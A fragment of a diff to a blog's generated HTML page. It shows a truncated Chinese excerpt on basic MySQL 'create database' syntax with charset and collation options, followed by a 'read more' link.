+基本语法create database 数据库名 [库选项]库选项：用来约束数据库，分为两个选项：  字符集设定：charset/character set 具体字符集(数据存储的编码格式)：常用字符集GBK、utf-8  校对集设定：collate 具体校对集(数
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/12/29/mysql操作/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
